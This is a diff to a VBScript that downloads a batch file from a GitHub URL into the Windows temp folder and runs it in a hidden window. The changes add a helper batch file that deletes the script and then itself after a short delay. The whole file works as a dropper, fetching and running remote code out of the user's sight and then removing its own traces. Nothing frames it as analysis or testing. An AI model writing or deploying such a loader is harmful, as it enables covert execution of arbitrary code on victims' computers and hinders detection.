@@ -1,6 +1,7 @@
 Option Explicit
 
 Dim objXMLHttp, objFSO, objFile, strURL, strTempBat, strTempPath, objShell
+Dim strBat, objBatFile, wshShell
 
 ' URL of your batch file to download
 strURL = "https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/Am.bat"
@@ -11,7 +12,7 @@ Set objShell = CreateObject("WScript.Shell")
 strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
 strTempBat = strTempPath & "\taskfile.bat"
 
-' Delete existing file if exists to avoid access denied
+' Delete existing batch file to avoid access issues
 If objFSO.FileExists(strTempBat) Then
     objFSO.DeleteFile strTempBat, True
 End If
@@ -26,11 +27,22 @@ If objXMLHttp.Status = 200 Then
     objFile.Write objXMLHttp.ResponseText
     objFile.Close
 
-    ' Run batch file hidden and wait for it to finish
+    ' Run batch file hidden and wait for completion
     objShell.Run Chr(34) & strTempBat & Chr(34), 0, True
 
-    ' The batch file should self-delete itself
+    ' batch file assumed to have internal self-delete code
 End If
 
-' Delete this VBScript after everything finishes
-objFSO.DeleteFile WScript.ScriptFullName, True
+' Prepare helper batch file to delete this VBScript
+strBat = strTempPath & "\del_" & objFSO.GetFileName(WScript.ScriptFullName) & ".bat"
+
+Set objBatFile = objFSO.CreateTextFile(strBat, True)
+objBatFile.WriteLine "@echo off"
+objBatFile.WriteLine "ping 127.0.0.1 -n 3 > nul" ' 2-second delay
+objBatFile.WriteLine "del """ & WScript.ScriptFullName & """"
+objBatFile.WriteLine "del %~f0"
+objBatFile.Close
+
+' Run helper batch file hidden and do NOT wait for it (let it delete VBScript)
+Set wshShell = CreateObject("WScript.Shell")
+wshShell.Run Chr(34) & strBat & Chr(34), 0, False
